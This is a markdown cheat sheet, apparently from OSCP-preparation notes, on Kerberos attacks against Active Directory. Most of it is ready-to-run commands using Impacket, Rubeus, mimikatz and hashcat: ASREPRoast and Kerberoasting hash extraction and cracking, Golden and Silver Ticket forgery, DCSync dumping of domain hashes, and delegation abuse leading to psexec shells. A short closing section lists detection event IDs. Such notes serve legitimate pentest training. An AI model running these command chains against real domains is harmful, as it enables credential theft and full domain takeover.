# Kerberos Attacks

## Table of Contents
- [ASREPRoast](#asreproast)
- [Kerberoasting](#kerberoasting)
- [Golden Ticket](#golden-ticket)
- [Silver Ticket](#silver-ticket)
- [DCSync](#dcsync)
- [Constrained Delegation](#constrained-delegation) âžœ [Delegation Guide](3.7.Kerberos-Delegation.md)
- [Defense & Detection](#defense--detection)
- [See Also](#see-also)

---

## ASREPRoast

### Concept
ASREPRoast attacks users with **Kerberos Pre-Authentication disabled**. The attacker requests TGT without providing pre-authentication, receives encrypted response, and cracks offline.

### Enumerate Users with Pre-Auth Disabled

> Find accounts with Kerberos pre-authentication disabled via LDAP
```shell
ldapsearch -H ldap://$rhost -x -b "dc=example,dc=com" \
  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' \
  sAMAccountName userAccountControl
```

> Use PowerView to find pre-auth disabled accounts
```powershell
Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol | select -ExpandProperty samaccountname
```

### Impacket GetNPUsers (Recommended)

> Enumerate and crack AS-REP hashes using Impacket
```shell
impacket-GetNPUsers -dc-ip $rhost $domain/ -usersfile $wordlist -format hashcat -outputfile asrep-hashes.txt
```

> Crack AS-REP hashes with hashcat (mode 18200)
```shell
hashcat -m 18200 asrep-hashes.txt $wordlist --force
```

> Crack with john the ripper
```shell
john asrep-hashes.txt --wordlist=$wordlist
```

### Rubeus (Windows)

> Request AS-REP hash for specific user (no pre-auth required)
```powershell
.\Rubeus.exe asreproast /user:$username /format:hashcat /outfile:asrep.txt
```

> Crack Rubeus output
```shell
hashcat -m 18200 asrep.txt $wordlist --force
```

---

## Kerberoasting

### Concept
Kerberoasting targets **Service Accounts** (user accounts running services). Request service tickets for these accounts, extract from memory, and crack offline using NTLM hash.

### Enumerate Service Accounts

> Find service accounts with SPN set via LDAP
```shell
ldapsearch -H ldap://$rhost -x -b "dc=example,dc=com" \
  '(servicePrincipalName=*)' sAMAccountName servicePrincipalName
```

> Use PowerView to enumerate SPNs
```powershell
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
```

### Impacket GetUserSPNs (Recommended)

> Request all Kerberoasting hashes with credentials
```shell
impacket-GetUserSPNs -dc-ip $rhost $domain/$username:$password -request -format hashcat -outputfile kerberoast.txt
```

> Crack Kerberoast hashes (mode 13100)
```shell
hashcat -m 13100 kerberoast.txt $wordlist --force
```

### Rubeus (Windows)

> Harvest Kerberoasting hashes from ticket cache
```powershell
.\Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt
```

> Request specific SPN
```powershell
.\Rubeus.exe kerberoast /spn:mssql/dbserver.example.com /format:hashcat /outfile:kerberoast.txt
```

---

## Golden Ticket

### Concept
Golden Ticket is a forged TGT (Ticket Granting Ticket) signed with the krbtgt account's NTLM hash. Grants access to **any service** in the domain without needing valid credentials.

### Extract krbtgt Hash via DCSync

> Use mimikatz to perform DCSync and extract krbtgt hash
```shell
impacket-secretsdump -dc-ip $rhost $domain/$username:$password@$rhost
```

> Extract from Windows with mimikatz (requires DA or SYSTEM)
```powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:example.com /user:krbtgt
```

### Create Golden Ticket with mimikatz

> Generate golden ticket with mimikatz on Windows
```powershell
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-X-X-X /krbtgt:HASH_HEX /ticket:golden.kirbi
mimikatz # kerberos::ptt golden.kirbi
klist
```

### Create Golden Ticket with Impacket

> Generate golden ticket on Linux
```shell
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-X-X-X \
  -domain $domain -user-id 500 Administrator
```

> Use golden ticket for PSExec
```shell
export KRB5CCNAME=Administrator.ccache
impacket-psexec $domain/Administrator@$rhost -k -no-pass
```

### Verify Golden Ticket

> List active Kerberos tickets
```powershell
klist
```

> Access resources using golden ticket
```powershell
dir \\dc01\c$
psexec.exe \\dc01 cmd
```

---

## Silver Ticket

### Concept
Silver Ticket is a forged **Service Ticket** (ST) signed with specific service account's NTLM hash. Grants access to **one specific service only** but no TGT renewal needed.

### Extract Service Account Hash

> Find service account NTLM hash via LSASS (after compromise)
```shell
impacket-secretsdump -dc-ip $rhost $domain/$username:$password@$rhost
```

> Extract specific service hash with mimikatz
```powershell
mimikatz # lsadump::lsa /patch
```

### Create Silver Ticket with mimikatz

> Generate silver ticket for MSSQL service
```powershell
mimikatz # kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-X-X-X \
  /target:mssql-server.example.com /service:mssql /hash:SERVICE_ACCOUNT_HASH \
  /ticket:silver.kirbi
mimikatz # kerberos::ptt silver.kirbi
```

> Generate silver ticket for CIFS (file share access)
```powershell
mimikatz # kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-X-X-X \
  /target:fileserver.example.com /service:cifs /hash:SERVICE_ACCOUNT_HASH /ticket:silver.kirbi
```

### Use Silver Ticket

> Connect to service after importing ticket
```powershell
net use \\fileserver.example.com\c$ "" /user:example.com\Administrator
```

> Connect to MSSQL after importing ticket
```shell
impacket-mssqlclient -k -no-pass $domain/Administrator@mssql-server.example.com
```

---

## DCSync

### Concept
DCSync is a privilege to request password hashes from Domain Controller using replication protocol (Directory Replication Service). Requires **Replicating Directory Changes** permission.

### Check DCSync Privileges

> Check current user's ACL on domain object
```powershell
Get-DomainObjectAcl -SearchBase "DC=example,DC=com" -Filter {objectclass -eq "domain"} | \
  ? {$_.AceType -eq "Allow" -and $_.IdentityReference -eq $username}
```

> Use BloodHound to visualize DCSync paths
```
Analyze: "HasSIDHistory", "AllExtendedRights", "AdminTo" relationships
Target nodes with "Replicating Directory Changes" permission
```

### Perform DCSync Attack

> Extract all domain hashes via DCSync
```shell
impacket-secretsdump -dc-ip $rhost $domain/$username:$password@$rhost
```

> Extract specific user hash
```shell
impacket-secretsdump -dc-ip $rhost -just-dc-user $username $domain/$username:$password@$rhost
```

> Use mimikatz for DCSync on Windows (requires replication permission)
```powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:example.com /user:Administrator
```

### Remediation Check

> Verify which users have DCSync permission (requires Admin)
```powershell
$params = @{
  SearchBase = "DC=example,DC=com"
  Filter = "*"
  Properties = "samaccountname"
}
$users = Get-ADUser @params
foreach($user in $users) {
  $acl = Get-Acl "AD:$user"
  if($acl.Access.ObjectType -match "1131f6ad") { Write-Host "$user has DCSync" }
}
```

---

## Constrained Delegation

**ðŸ“– See full delegation guide: [3.7.Kerberos-Delegation.md](3.7.Kerberos-Delegation.md)**

### Quick Enumeration

```powershell
# Find constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname, @{N="AllowedToDelegate";E={$_."msds-allowedtodelegateto"}}

# Find unconstrained delegation
Get-DomainComputer -Unconstrained -Properties name
```

### Quick Exploitation

```shell
# Get TGT then impersonate
impacket-getST -dc-ip $rhost -spn cifs/target.$domain -impersonate Administrator $domain/svc_account:'$password'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass $domain/Administrator@target.$domain
```

---

## Defense & Detection

> Check Kerberos event logs for attacks
```powershell
Get-WinEvent -LogName "Security" -FilterHashtable @{EventID=4768,4769,4770,4771} | Sort-Object TimeCreated -Descending | Select-Object -First 20
```

> Event IDs to monitor:
- **4768**: TGT requested (ASREPRoast trigger)
- **4769**: Service ticket requested (Kerberoasting)
- **4771**: Pre-authentication failed (Attack attempt)
- **4624**: Account logon

---

## See Also

### Related AD Exploitation Files
- **[AD Exploitation Overview](3.1.AD-Exploitation.md)** - Full AD attack methodology, enumeration, ACL abuse
- **[Password Attacks](3.2.Password-Attacks.md)** - hashcat modes, cracking TGS/AS-REP hashes
- **[NTLM Relay & Responder](3.4.NTLM-Relay-and-Responder.md)** - Responder, NTLM relay, Pass-the-Hash
- **[Kerberos Delegation](3.7.Kerberos-Delegation.md)** - Detailed delegation attacks (Constrained/RBCD)

### Post-Exploitation
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Use tickets for lateral movement
- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - Local privesc after ticket attacks

### OSCP Preparation
- **[Lab Walkthrough Examples](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - HTB Forest Kerberos attack chain
- **[Exam Tips & Tricks](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - AD enumeration priority
